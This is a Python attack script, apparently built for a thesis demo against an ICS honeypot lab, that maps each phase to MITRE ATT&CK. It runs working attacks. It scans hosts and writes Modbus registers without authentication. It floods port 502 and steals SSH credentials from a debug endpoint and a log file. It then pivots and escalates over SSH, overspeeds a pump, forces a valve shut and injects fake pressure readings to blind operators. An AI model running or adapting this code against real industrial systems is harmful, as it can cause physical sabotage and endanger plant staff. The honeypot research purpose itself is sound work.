"""
ICS Honeypot Attack Suite — Realistic Kill Chain (Purdue Model)
================================================================
Every phase uses REAL Linux/Kali tools.
Every [CMD] line shows the exact command executed — copy-paste ready.

Features:
- MITRE ATT&CK Framework Mapping
- Cyber Kill Chain Mapping
- Purdue Model Journey (Level 3.5 DMZ → L3 API → L2 SCADA → L2 OT)

Usage (from attacker_node bash):
    python3 attack_suite.py [--phase N]

    --phase 0   run ALL phases (full MITRE mapped kill chain)
    --phase 6   only lateral movement (most impressive for thesis demo)
"""

import sys
import os
import json
import socket
import struct
import time
import subprocess
import argparse

# ── Optional dependencies ──────────────────────────────────────────────────────
try:
    from pymodbus.client import ModbusTcpClient
    HAS_MODBUS = True
except ImportError:
    HAS_MODBUS = False

try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Targets ───────────────────────────────────────────────────────────────────
# The attacker starts in DMZ-net, so they hit the decoy historian.
DEFAULT_TARGETS = {
    "modbus":         os.environ.get("MODBUS_TARGET",    "plc_simulator"),
    "s7":             os.environ.get("S7_TARGET",        "ics_s7_plc"),
    "dnp3":           os.environ.get("DNP3_TARGET",      "ics_dnp3"),
    "scada_ssh":      os.environ.get("SCADA_SSH_TARGET", "ics_scada_ssh"),
    "historian_api":  os.environ.get("HONEYPOT_API",     "honeypot_historian_api"),
    "historian_port": int(os.environ.get("HONEYPOT_PORT", "5000")),
}

MODBUS_PORT = 502
S7_PORT     = 102
DNP3_PORT   = 20000
SSH_PORT    = 2222

REG_PRESSURE       = 100
REG_FLOW_RATE      = 101
REG_TEMPERATURE    = 102
REG_PUMP_RPM       = 103
REG_ACTUATOR_RPM   = 200
REG_VALVE_PERCENT  = 201
REG_VALVE_TOGGLE   = 202

SEPARATOR = "\n" + "=" * 70

# ── Output formatting ─────────────────────────────────────────────────────────
def _c(code, text): return f"\033[{code}m{text}\033[0m"

def banner(title):         print(f"\n{'='*70}\n  {title}\n{'='*70}")
def cmd_label(cmd):        print(f"\n  {_c('1;33','[CMD]')}  {cmd}")
def result(k, v):          print(f"  {_c('1;32','[+]')} {k}: {v}")
def fail(msg):             print(f"  {_c('1;31','[-]')} {msg}")
def warn(msg):             print(f"  {_c('1;31','[!]')} {msg}")
def info(msg):             print(f"  {_c('1;34','[*]')} {msg}")
def found(msg):            print(f"  {_c('1;35','[FOUND]')} {msg}")

def mitre(tid: str, name: str, desc: str):
    print(f"  {_c('1;36','[MITRE]')} {tid} - {name} ({desc})")

def killchain(phase: str):
    print(f"  {_c('1;36','[KILL CHAIN]')} {phase}")


def run_cmd(cmd: str, timeout: int = 20) -> str:
    cmd_label(cmd)
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        output = (out.stdout + out.stderr).strip()
        for line in output.splitlines():
            print(f"         {line}")
        return output
    except subprocess.TimeoutExpired:
        warn(f"Command timed out after {timeout}s")
        return ""
    except Exception as e:
        warn(f"Command error: {e}")
        return ""

def sleep_label(s: float, label: str = ""):
    # Brief pause between phases — command IS running; will continue automatically.
    desc = f" ({label})" if label else ""
    print(f"  [ Pausing {s}s between phases — continuing automatically... ]{desc}")
    time.sleep(s)

def _tcp_open(host, port, timeout=2) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


# ─────────────────────────────────────────────────────────────────────────────
# Phase 1: Reconnaissance
# ─────────────────────────────────────────────────────────────────────────────
def phase1_recon(targets: dict):
    banner("PHASE 1: RECONNAISSANCE")
    killchain("Reconnaissance")
    mitre("T1595", "Active Scanning", "Spray scan to discover open service ports")
    
    modbus_host = targets["modbus"]
    api_host    = targets["historian_api"]

    info("Step 1 — Broad spray on common IT ports (mostly closed)")
    run_cmd(f"nmap -sT -n -T4 --open -p 22,23,80,443,3306,5432,8080,8443,3389,21 {modbus_host} 2>&1", 20)
    info("Suspicion: Unresponsive to IT ports — likely an ICS/OT device.")

    mitre("T1595.002", "Active Scanning: Vulnerability Scanning", "Targeted query of ICS specific ports")
    info("Step 2 — Targeted scan on common ICS ports")
    run_cmd(f"nmap -sT -n -T4 --open -p 102,502,20000,44818,47808,1962,2404 {modbus_host} {targets['s7']} 2>&1", 30)

    info("Step 3 — API Discovery scan (enterprise telemetry ports)")
    run_cmd(f"nmap -sT -n -T4 --open -p 3000,5000,5001,8001,8060,8086 {api_host} 2>&1", 20)

    mitre("T1018", "Remote System Discovery", "ICMP sweeps for live targets")
    info("Step 4 — ICMP ping sweep to confirm liveliness")
    for host in [modbus_host, targets["s7"], targets["dnp3"], api_host]:
        run_cmd(f"hping3 -c 3 --icmp {host} 2>&1", timeout=8)

    result("Recon complete", f"ICS ports confirmed on {modbus_host}; API found on {api_host}")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 2: Information Gathering
# ─────────────────────────────────────────────────────────────────────────────
def phase2_info_gathering(targets: dict):
    banner("PHASE 2: INFORMATION GATHERING")
    killchain("Weaponization / Reconnaissance")
    mitre("T1046", "Network Service Discovery", "Nmap NSE script detection for Modbus/S7")
    
    host    = targets["modbus"]
    s7_host = targets["s7"]

    info("Step 1 — nmap Modbus NSE discovery script")
    run_cmd(f"nmap -sT -n --script modbus-discover -p {MODBUS_PORT} {host} 2>&1", 20)

    info("Step 2 — nmap S7 info NSE script (Siemens banner)")
    run_cmd(f"nmap -sT -n --script s7-info -p {S7_PORT} {s7_host} 2>&1", 20)

    mitre("T0811", "Data from Information Repositories", "Modbus FC3 holding register readout")
    info("Step 3 — Modbus FC3 read: sensor holding registers 100-103")
    cmd_label(f"mbtget -r3 -a1 -c4 {host}  # FC3 read 4 regs starting at 100")
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        try:
            if client.connect():
                rr = client.read_holding_registers(REG_PRESSURE, count=4)
                if not rr.isError():
                    result("Pressure", f"{rr.registers[0]} PSI")
                    result("Flow",     f"{rr.registers[1] / 10.0:.1f} L/s")
                    result("Temp",     f"{rr.registers[2]} °C")
                    result("RPM",      f"{rr.registers[3]} RPM")
        finally:
            client.close()

    info("Step 4 — Probe actuator register block (200–202)")
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        if client.connect():
            rr2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=3)
            if not rr2.isError():
                result("Actuator block", f"RPM={rr2.registers[0]} Valve={rr2.registers[1]}")
            client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 3: Vulnerability Scan
# ─────────────────────────────────────────────────────────────────────────────
def phase3_vuln_scan(targets: dict):
    banner("PHASE 3: VULNERABILITY SCAN")
    killchain("Weaponization")
    mitre("T1190", "Exploit Public-Facing Application", "Fingerprinting to find missing auth on OT ports")

    host    = targets["modbus"]
    s7_host = targets["s7"]

    info("Step 1 — Full ICS NSE suite: modbus-discover, dnp3-info, s7-info")
    run_cmd(f"nmap -sT -n -T4 --open --script modbus-discover,s7-info -p 502,102 {host} {s7_host} 2>&1", 30)

    mitre("T1046", "Network Service Discovery", "netcat banner grabbing")
    info("Step 2 — netcat banner probe")
    for h, port in [(host, 502), (s7_host, 102)]:
        cmd_label(f"echo '' | nc -w2 {h} {port} | xxd | head -3")
        try:
            s = socket.create_connection((h, port), timeout=2)
            resp = s.recv(64)
            s.close()
        except Exception:
            pass

    mitre("T0861", "Point & Tag Identification", "Validating Modbus write capabilities")
    info("Step 3 — Testing missing Modbus authentication (FC6 arbitrary write test)")
    if HAS_MODBUS:
        client = ModbusTcpClient(host, port=MODBUS_PORT)
        if client.connect():
            r2 = client.read_holding_registers(REG_ACTUATOR_RPM, count=1)
            safe = r2.registers[0] if not r2.isError() else 1200
            wr = client.write_register(REG_ACTUATOR_RPM, value=safe)
            result("Missing Auth", "VULNERABLE! Host accepted FC6 arbitrary write with no auth.")
            client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 4: Exploit
# ─────────────────────────────────────────────────────────────────────────────
def phase4_exploit(targets: dict):
    banner("PHASE 4: EXPLOIT — Semantic Injection")
    killchain("Exploitation / Actions on Objectives")
    mitre("T0836", "Modify Parameter", "Injecting false telemetry to spoof sensor state")
    
    warn("Writing 350 PSI to pressure sensor bypasses physical reality limits.")
    host = targets["modbus"]
    if not HAS_MODBUS: return

    cmd_label(f"mbtget -w6 {host} 100 350  # Write 350 PSI to register 100")
    client = ModbusTcpClient(host, port=MODBUS_PORT)
    if client.connect():
        r = client.write_register(REG_PRESSURE, value=350)
        result("FC6 Exploit", "Success! Semantic anomaly generated.")
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 5: Payload Delivery
# ─────────────────────────────────────────────────────────────────────────────
def phase5_payload(targets: dict):
    banner("PHASE 5: PAYLOAD DELIVERY")
    killchain("Delivery / Actions on Objectives")
    
    host = targets["modbus"]

    mitre("T0814", "Denial of Service", "SYN flood against ICS gateway")
    info("Step 1 — hping3 SYN flood on Modbus port 502 (5s burst)")
    run_cmd(f"hping3 -S -p {MODBUS_PORT} --flood --count 500 {host} 2>&1", 10)

    mitre("T0836", "Modify Parameter", "Stealth cumulative drift to bypass simple thresholds")
    info("Step 2 — Stealth drift: +5 PSI over successive steps")
    if not HAS_MODBUS: return

    client = ModbusTcpClient(host, port=MODBUS_PORT)
    if client.connect():
        for step in range(15):
            new_p = 120 + (step + 1) * 5
            cmd_label(f"mbtget -w6 {host} {REG_PRESSURE} {new_p}")
            client.write_register(REG_PRESSURE, value=new_p)
            time.sleep(1)
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 6: Lateral Movement & Privilege Escalation
# ─────────────────────────────────────────────────────────────────────────────
def phase6_lateral_movement(targets: dict):
    banner("PHASE 6: DISCOVERY & LATERAL MOVEMENT")
    killchain("Lateral Movement & Privilege Escalation")
    
    api_host  = targets["historian_api"]
    api_port  = targets["historian_port"]
    api_base  = f"http://{api_host}:{api_port}"

    mitre("T1596", "Search Open Technical Databases", "API fuzzing to locate vulnerable endpoints")
    info("━━ Step 1: API Endpoint fuzzing ━━")
    for path in ["/api/health", "/api/alerts", "/api/debug"]:
        cmd_label(f"curl -s -o /dev/null -w '%{{http_code}}' {api_base}{path}")
        time.sleep(0.5)

    mitre("T1552.004", "Unsecured Credentials: API", "Exploiting developer debug endpoint leak")
    info("━━ Step 2: Exploit /api/debug — CWE-215 Info Leak ━━")
    cmd_label(f"curl -s {api_base}/api/debug | python3 -m json.tool")
    
    scada_host, scada_port = targets["scada_ssh"], SSH_PORT
    scada_user, scada_pass = "engineer", "engineer456"  # Initial low-privilege access

    try:
        r = _requests.get(f"{api_base}/api/debug", timeout=5)
        env = r.json().get("environment", {})
        scada_host = env.get("SCADA_SSH_HOST", scada_host)
        scada_user = env.get("SCADA_SSH_USER", scada_user)
        scada_pass = env.get("SCADA_SSH_PASS", scada_pass)
        found(f"Leaked Creds → {scada_user} / {scada_pass} @ {scada_host}:{scada_port}")
    except Exception:
        warn("Could not query honeypot API; assuming defaults for demo.")

    mitre("T1078.003", "Valid Accounts: Local Accounts", "Logging into SCADA workstation with leaked LOW PRIVILEGE creds")
    info("━━ Step 3: Login as Engineer (Read-Only) ━━")
    eng_ssh = f"sshpass -p '{scada_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {scada_user}@{scada_host}"
    cmd_label(f"{eng_ssh} 'whoami'")
    login_out = run_cmd(f"{eng_ssh} 'echo SHELL_OK' 2>&1", 10)
    if "SHELL_OK" in login_out:
        result("SSH PIVOT", f"Shell obtained: {scada_user}@{scada_host} (Engineer Role)")
        
    mitre("T1082", "System Information Discovery", "Enumerating network context and dead-ends inside SCADA")
    info("━━ Step 4: Deception Discovery (Fake PLC) ━━")
    cmd_label(f"{eng_ssh} 'cat /etc/hosts'")
    run_cmd(f"{eng_ssh} 'cat /etc/hosts'", 5)
    info("Attacker sees 'fake_plc_sim' and attempts to write to it, but it's a dead end.")
    
    mitre("T1552.003", "Unsecured Credentials: Bash History", "Investigating engineer history for lateral paths")
    info("━━ Step 5: Enumerate Human Artifacts for Privilege Escalation ━━")
    cmd_label(f"{eng_ssh} 'cat ~/.bash_history'")
    out_hist = run_cmd(f"{eng_ssh} 'cat ~/.bash_history'", 5)
    
    mitre("T1005", "Data from Local System", "Finding operator credentials accidentally left in maintenance logs")
    cmd_label(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'")
    log_out = run_cmd(f"{eng_ssh} 'cat /var/log/scada_maintenance.log'", 5)
    
    op_pass = "operator123"
    if "operator123" in log_out:
        found("Credentials discovered in maintenance log: operator / operator123")
    
    mitre("T1078.001", "Valid Accounts: Default Accounts", "Escalating privileges to Operator role for full Modbus access")
    info("━━ Step 6: Privilege Escalation to Operator ━━")
    op_user = "operator"
    op_ssh = f"sshpass -p '{op_pass}' ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host}"
    cmd_label(f"{op_ssh} 'whoami'")
    op_out = run_cmd(f"{op_ssh} 'echo OPERATOR_OK' 2>&1", 10)
    if "OPERATOR_OK" in op_out:
        result("PRIVILEGE ESCALATION", "Escalated from Engineer -> Operator. Full Modbus write access acquired.")

    mitre("T1090.001", "Proxy: Internal Proxy", "Setting up an SSH tunnel as Operator to securely reach the OT segment")
    info("━━ Step 7: SSH port-forward to OT layer ━━")
    cmd_label(f"ssh -o StrictHostKeyChecking=no -p {scada_port} {op_user}@{scada_host} -L 10502:{targets['modbus']}:502 -N -f")


# ─────────────────────────────────────────────────────────────────────────────
# Phase 7: Privilege Escalation
# ─────────────────────────────────────────────────────────────────────────────
def phase7_privesc(targets: dict):
    banner("PHASE 7: PRIVILEGE ESCALATION (Actuator Hijack)")
    killchain("Actions on Objectives")
    mitre("T0883", "Manipulation of Control", "Sending FC6 instructions to directly command actuators")
    
    host = targets["modbus"]
    if not HAS_MODBUS: return

    cmd_label(f"mbtget -w6 {host} {REG_ACTUATOR_RPM} 3000  # Over-speed pump")
    client = ModbusTcpClient(host, port=MODBUS_PORT)
    if client.connect():
        client.write_register(REG_ACTUATOR_RPM, value=3000)
        time.sleep(2)
        cmd_label(f"mbtget -w6 {host} {REG_VALVE_TOGGLE} 0     # Force valve closed")
        client.write_register(REG_VALVE_TOGGLE, value=0)
        result("Sabotage Complete", "Overspeed + block condition initiated.")
        client.close()


# ─────────────────────────────────────────────────────────────────────────────
# Phase 8: Replay Attack
# ─────────────────────────────────────────────────────────────────────────────
def phase8_replay(targets: dict):
    banner("PHASE 8: REPLAY ATTACK — Telemetry Spoofing")
    killchain("Actions on Objectives")
    mitre("T0813", "Denial of View / Replay Attack", "Sustained injection of frozen telemetry to InfluxDB to blind the operator")
    
    INFLUX_URL   = "http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns"
    INFLUX_TOKEN = os.environ.get("INFLUX_TOKEN", "supersecrettoken")

    cmd_label(f"curl -XPOST '{INFLUX_URL}' -H 'Authorization: Token {INFLUX_TOKEN}' --data-raw 'pipeline_metrics pressure=120.0'")

    if not HAS_REQUESTS: return

    headers = {
        "Authorization": f"Token {INFLUX_TOKEN}",
        "Content-Type":  "text/plain; charset=utf-8",
    }
    for i in range(15):
        payload = f"pipeline_metrics,location=pump_station_01,source=historian_bridge pressure=120.0 {time.time_ns()}"
        try:
            _requests.post(INFLUX_URL, headers=headers, data=payload, timeout=2)
            print(f"         [Spoofed Frame {i+1}/15] -> pressure=120.0 (Operator Blinded)")
        except Exception:
            pass
        time.sleep(0.1)


# ─────────────────────────────────────────────────────────────────────────────
PHASES = {
    1: phase1_recon,
    2: phase2_info_gathering,
    3: phase3_vuln_scan,
    4: phase4_exploit,
    5: phase5_payload,
    6: phase6_lateral_movement,
    7: phase7_privesc,
    8: phase8_replay,
}

def main():
    parser = argparse.ArgumentParser(description="ICS Honeypot — MITRE-Mapped Kill Chain")
    parser.add_argument("--phase", type=int, default=0, help="Phase 1-8; 0=all")
    args = parser.parse_args()

    targets = DEFAULT_TARGETS
    if args.phase == 0:
        for phase_fn in PHASES.values():
            phase_fn(targets)
            sleep_label(2)
        print(SEPARATOR)
        print("  [DONE] Full MITRE ATT&CK Kill Chain Executed")
    elif args.phase in PHASES:
        PHASES[args.phase](targets)
    else:
        print("Invalid phase")
        sys.exit(1)

    # ── Restore terminal after hping3 --flood may have corrupted stty ─────────
    # hping3 puts the tty into raw/no-echo mode; 'stty sane' restores it so the
    # bash prompt is usable immediately after the script exits.
    os.system("stty sane 2>/dev/null || true")

if __name__ == "__main__":
    main()
